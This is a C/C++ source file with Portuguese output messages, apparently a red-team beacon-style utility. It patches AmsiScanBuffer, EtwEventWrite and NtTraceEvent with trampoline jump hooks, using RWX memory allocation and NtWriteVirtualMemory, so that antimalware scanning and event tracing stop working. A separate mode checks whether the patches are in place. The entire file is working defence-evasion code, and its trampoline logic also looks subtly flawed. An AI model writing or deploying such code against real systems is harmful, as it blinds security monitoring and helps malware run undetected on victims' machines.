#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>

#define NT_SUCCESS 0x00000000
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

#define BeaconPrintf(type, fmt, ...) printf(fmt, __VA_ARGS__)
#define CALLBACK_OUTPUT 0
#define CALLBACK_ERROR 1

typedef struct { char* original; char* buffer; int length; int size; } datap;
void BeaconDataParse(datap* parser, char* buffer, int size) {}
int BeaconDataInt(datap* parser) { return 0; }

typedef HMODULE(WINAPI* GetModuleHandleA_t) (LPCSTR);
typedef FARPROC(WINAPI* GetProcAddress_t) (HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryA_t) (LPCSTR);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

GetModuleHandleA_t pGetModuleHandleA = NULL;
GetProcAddress_t pGetProcAddress = NULL;
LoadLibraryA_t pLoadLibraryA = NULL;
NtWriteVirtualMemory_t pNtWriteVirtualMemory = NULL;
NtProtectVirtualMemory_t pNtProtectVirtualMemory = NULL;
NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = NULL;

BOOL ResolveAPI() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    if (!hKernel32 || !hNtdll) {
        printf("[-] Falha ao obter handle(s) de modulo(s) (Kernel32 ou Ntdll).\n");
        return FALSE;
    }

    pGetModuleHandleA = (GetModuleHandleA_t)GetProcAddress(hKernel32, "GetModuleHandleA");
    pGetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, "GetProcAddress");
    pLoadLibraryA = (LoadLibraryA_t)GetProcAddress(hKernel32, "LoadLibraryA");

    pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

    if (!pGetModuleHandleA || !pGetProcAddress || !pLoadLibraryA ||
        !pNtWriteVirtualMemory || !pNtProtectVirtualMemory || !pNtAllocateVirtualMemory) {
        printf("[-] Falha ao resolver uma ou mais APIs de sistema necessarias.\n");
        return FALSE;
    }

    return TRUE;
}

void trampolinePatch(const char* moduleName, const char* functionName, const char* desc) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Tentando patch trampoline para %s...\n", desc);

    HMODULE mod = pGetModuleHandleA(moduleName);
    if (!mod) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Nao foi possivel obter handle de modulo para %s\n", moduleName);
        return;
    }

    BYTE* target = (BYTE*)pGetProcAddress(mod, functionName);
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Nao foi possivel obter endereco de %s\n", functionName);
        return;
    }

    SIZE_T patchLen = 12;

    PVOID trampoline = NULL;
    SIZE_T regionSize = 0x1000;

    NTSTATUS status = pNtAllocateVirtualMemory(NtCurrentProcess(), &trampoline, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != NT_SUCCESS || trampoline == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtAllocateVirtualMemory falhou para trampoline (Status: 0x%lX)\n", status);
        return;
    }

    for (SIZE_T i = 0; i < patchLen; i++) {
        ((BYTE*)trampoline)[i] = target[i];
    }

    BYTE jmpBack[5] = { 0xE9 };
    DWORD rel = (DWORD)((BYTE*)target + patchLen - ((BYTE*)trampoline + patchLen + sizeof(jmpBack)));
    *((DWORD*)&jmpBack[1]) = rel;

    for (int i = 0; i < sizeof(jmpBack); i++) {
        ((BYTE*)trampoline)[patchLen + i] = jmpBack[i];
    }

    BYTE patch[5] = { 0xE9 };
    DWORD relPatch = (DWORD)((BYTE*)trampoline - (target + sizeof(patch)));
    *((DWORD*)&patch[1]) = relPatch;

    PVOID base = target;
    ULONG oldProtect = 0, newProtect = 0;
    SIZE_T patchSize = sizeof(patch);

    status = pNtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtProtectVirtualMemory falhou para alvo (Status: 0x%lX)\n", status);
        return;
    }

    status = pNtWriteVirtualMemory(NtCurrentProcess(), target, patch, sizeof(patch), NULL);
    if (status != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtWriteVirtualMemory falhou (Status: 0x%lX)\n", status);
    }

    pNtProtectVirtualMemory(NtCurrentProcess(), &base, (PULONG)&patchSize, oldProtect, &newProtect);

    if (status == NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Patch trampoline aplicado a %s (Alvo: %p, Trampoline: %p)\n", desc, target, trampoline);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Patch trampoline FALHOU para %s\n", desc);
    }
}

void patchAmsi() {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Tentando patch AMSI...\n");
    pLoadLibraryA("amsi.dll");
    trampolinePatch("amsi.dll", "AmsiScanBuffer", "AMSI");
}

void patchEtw() {
    trampolinePatch("ntdll.dll", "EtwEventWrite", "ETW");
}

void patchSysmon() {
    trampolinePatch("ntdll.dll", "NtTraceEvent", "NtTraceEvent (Sysmon)");
}

void run_command(int cmd) {
    if (cmd == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Aplicando patch AMSI, ETW e Sysmon usando hooks trampoline...\n");
        patchAmsi();
        patchEtw();
        patchSysmon();
    }
    else if (cmd == 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Aplicando patch AMSI apenas...\n");
        patchAmsi();
    }
    else if (cmd == 2) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Aplicando patch ETW apenas...\n");
        patchEtw();
    }
    else if (cmd == 3) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Aplicando patch NtTraceEvent apenas...\n");
        patchSysmon();
    }
    else if (cmd == 4) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Verificando status de patch para hooks conhecidos...\n");

        HMODULE hAmsi = pGetModuleHandleA("amsi.dll");
        if (!hAmsi) {
            hAmsi = pLoadLibraryA("amsi.dll");
        }

        HMODULE hNtdll = pGetModuleHandleA("ntdll.dll");
        if (!hNtdll) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] NTDLL nao encontrado. Nao e possivel checar ETW/NtTraceEvent.\n");
            return;
        }

        void* etw = pGetProcAddress(hNtdll, "EtwEventWrite");
        void* nttrace = pGetProcAddress(hNtdll, "NtTraceEvent");
        void* amsi = hAmsi ? pGetProcAddress(hAmsi, "AmsiScanBuffer") : NULL;

        auto check_patch = [](void* func, const char* name) {
            if (func) {
                if (((BYTE*)func)[0] == 0xE9) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s esta com patch (inicia com JMP)\n", name);
                }
                else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[-] %s esta provavelmente limpo (inicia com: %02X %02X %02X)\n", name, ((BYTE*)func)[0], ((BYTE*)func)[1], ((BYTE*)func)[2]);
                }
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] %s nao encontrado\n", name);
            }
            };

        check_patch(etw, "EtwEventWrite");
        check_patch(nttrace, "NtTraceEvent");
        check_patch(amsi, "AmsiScanBuffer");

    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Numero de comando invalido: %d\n", cmd);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Comandos disponiveis: 0=Todos, 1=AMSI, 2=ETW, 3=NtTraceEvent, 4=Checar\n");
    }
}

int main(int argc, char* argv[]) {
    printf("--- Utilidade de Trampoline Hooking ---\n");

    if (!ResolveAPI()) {
        printf("[FATAL] Nao foi possivel resolver as APIs do Windows necessarias. Saindo.\n");
        return 1;
    }

    int cmd = -1;
    if (argc > 1) {
        try {
            cmd = std::stoi(argv[1]);
        }
        catch (const std::exception& e) {
            printf("[ERRO] Argumento invalido. Passe um unico numero inteiro (0-4).\n");
            printf("[*] Uso: %s <numero_do_comando>\n", argv[0]);
            printf("[*] Comandos disponiveis: 0=Todos, 1=AMSI, 2=ETW, 3=NtTraceEvent, 4=Checar\n");
            return 1;
        }
    }
    else {
        printf("[*] Nenhum comando fornecido. Usando 'Todos' (0) por padrao.\n");
        printf("[*] Uso: %s <numero_do_comando>\n", argv[0]);
        printf("[*] Comandos disponiveis: 0=Todos, 1=AMSI, 2=ETW, 3=NtTraceEvent, 4=Checar\n");
        cmd = 0;
    }

    run_command(cmd);

    printf("--- Execucao Concluida ---\n");
    return 0;
}